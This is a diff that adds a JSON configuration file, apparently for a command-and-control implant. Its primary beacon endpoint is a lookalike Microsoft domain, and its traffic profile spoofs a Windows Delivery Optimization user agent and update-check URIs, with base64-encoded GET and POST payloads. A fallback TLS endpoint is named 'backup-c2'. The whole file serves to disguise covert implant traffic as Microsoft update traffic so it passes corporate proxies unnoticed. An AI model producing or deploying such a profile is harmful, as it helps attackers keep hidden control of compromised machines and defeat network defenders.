@@ -1,0 +1,48 @@
+{
+  "_description": "Corporate environment: HTTPS through authenticating proxy with fallback to direct",
+  "strategy": "priority",
+  "dead_time_secs": 300,
+  "endpoints": [
+    {
+      "host": "updates.microsoft-services.com",
+      "port": 443,
+      "transport": "https",
+      "priority": 0,
+      "max_failures": 3,
+      "proxy": {
+        "use_system": true,
+        "url": "",
+        "username": "",
+        "password": ""
+      },
+      "profile": {
+        "name": "ms_update",
+        "user_agent": "Microsoft-Delivery-Optimization/10.0",
+        "format_http": false,
+        "http_get": {
+          "uris": ["/api/v1/delivery/check"],
+          "headers": {"Accept": "application/json", "X-Request-Type": "delivery-check"},
+          "data_transform": ["base64"]
+        },
+        "http_post": {
+          "uris": ["/api/v1/delivery/report"],
+          "headers": {"Content-Type": "application/json"},
+          "data_transform": ["base64"]
+        }
+      }
+    },
+    {
+      "host": "backup-c2.example.com",
+      "port": 8443,
+      "transport": "tls",
+      "priority": 10,
+      "max_failures": 10,
+      "proxy": {
+        "use_system": false,
+        "url": "",
+        "username": "",
+        "password": ""
+      }
+    }
+  ]
+}
